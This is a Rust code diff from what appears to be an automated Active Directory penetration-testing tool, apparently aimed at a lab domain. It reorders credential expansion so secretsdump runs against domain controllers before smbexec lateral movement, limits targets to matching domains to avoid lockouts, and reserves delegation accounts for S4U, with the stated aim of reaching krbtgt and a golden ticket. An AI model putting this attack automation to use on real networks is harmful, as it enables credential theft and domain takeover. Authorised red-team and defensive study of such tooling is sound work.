@@ -47,6 +47,10 @@ pub async fn auto_credential_expansion(
                 .credentials
                 .iter()
                 .filter(|c| !c.domain.is_empty() && !c.password.is_empty())
+                // Skip delegation accounts — their auth is reserved for S4U.
+                // Lateral movement and secretsdump with non-admin delegation
+                // creds wastes auth budget and risks lockout before S4U fires.
+                .filter(|c| c.is_admin || !state.is_delegation_account(&c.username))
                 .filter_map(|cred| {
                     let dedup = format!(
                         "{}:{}",
@@ -57,11 +61,45 @@ pub async fn auto_credential_expansion(
                         return None;
                     }
 
-                    // Collect non-owned host IPs in the same domain or any domain
+                    // Collect non-owned host IPs in the same domain (or child
+                    // domains). Cross-domain lateral attempts with wrong-domain
+                    // creds generate failed auth that triggers AD lockout.
+                    // Domain is extracted from hostname (e.g.,
+                    // winterfell.north.sevenkingdoms.local → north.sevenkingdoms.local).
+                    let cred_dom = cred.domain.to_lowercase();
                     let targets: Vec<String> = state
                         .hosts
                         .iter()
                         .filter(|h| !h.owned)
+                        .filter(|h| {
+                            // Resolve host domain: prefer hostname FQDN, fall
+                            // back to domain_controllers map for bare-IP hosts.
+                            let host_domain = {
+                                let from_hostname = h
+                                    .hostname
+                                    .to_lowercase()
+                                    .split_once('.')
+                                    .map(|x| x.1)
+                                    .unwrap_or("")
+                                    .to_string();
+                                if from_hostname.is_empty() {
+                                    state
+                                        .domain_controllers
+                                        .iter()
+                                        .find(|(_, ip)| ip.as_str() == h.ip)
+                                        .map(|(d, _)| d.to_lowercase())
+                                        .unwrap_or_default()
+                                } else {
+                                    from_hostname
+                                }
+                            };
+                            // Skip unknown-domain hosts — retry next cycle
+                            // after nmap populates hostnames.
+                            !host_domain.is_empty()
+                                && (host_domain == cred_dom
+                                    || host_domain.ends_with(&format!(".{cred_dom}"))
+                                    || cred_dom.ends_with(&format!(".{host_domain}")))
+                        })
                         .map(|h| h.ip.clone())
                         .collect();
 
@@ -97,27 +135,12 @@ pub async fn auto_credential_expansion(
         for item in work {
             let mut any_dispatched = false;
 
-            // 1. Try lateral movement on non-DC hosts (up to 5 targets)
-            let technique = LATERAL_TECHNIQUES[0]; // Start with smbexec
-            for target_ip in item.targets.iter().take(5) {
-                if let Ok(Some(task_id)) = dispatcher
-                    .request_lateral(target_ip, &item.credential, technique)
-                    .await
-                {
-                    any_dispatched = true;
-                    debug!(
-                        task_id = %task_id,
-                        target = %target_ip,
-                        technique = technique,
-                        username = %item.credential.username,
-                        "Credential expansion lateral dispatched"
-                    );
-                }
-            }
-
-            // 2. Try secretsdump on DCs for ALL credentials (not just admin).
-            // Includes child-domain DCs since parent creds are valid there.
-            // Admin creds get higher priority (2 vs 7).
+            // 1. Try secretsdump on DCs FIRST — this is the highest-value op
+            // for a new credential. Must run before lateral movement to avoid
+            // burning CredentialInflight slots on lower-value tasks.
+            // Admin creds get priority 2; non-admin get priority 3 (higher
+            // than lateral at 5) since secretsdump is the fastest path to
+            // krbtgt → DA → golden ticket.
             for dc_ip in &item.dc_ips {
                 let sd_dedup = format!(
                     "{}:{}:{}",
@@ -131,7 +154,7 @@ pub async fn auto_credential_expansion(
                 };
 
                 if !already_dumped {
-                    let priority = if item.is_admin { 2 } else { 7 };
+                    let priority = if item.is_admin { 2 } else { 3 };
                     if let Ok(Some(task_id)) = dispatcher
                         .request_secretsdump(dc_ip, &item.credential, priority)
                         .await
@@ -154,6 +177,26 @@ pub async fn auto_credential_expansion(
                             .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &sd_dedup)
                             .await;
                     }
+                }
+            }
+
+            // 2. Try lateral movement on non-DC hosts (up to 5 targets).
+            // Runs after secretsdump so the high-value op gets credential
+            // inflight slots first.
+            let technique = LATERAL_TECHNIQUES[0]; // Start with smbexec
+            for target_ip in item.targets.iter().take(5) {
+                if let Ok(Some(task_id)) = dispatcher
+                    .request_lateral(target_ip, &item.credential, technique)
+                    .await
+                {
+                    any_dispatched = true;
+                    debug!(
+                        task_id = %task_id,
+                        target = %target_ip,
+                        technique = technique,
+                        username = %item.credential.username,
+                        "Credential expansion lateral dispatched"
+                    );
                 }
             }
 
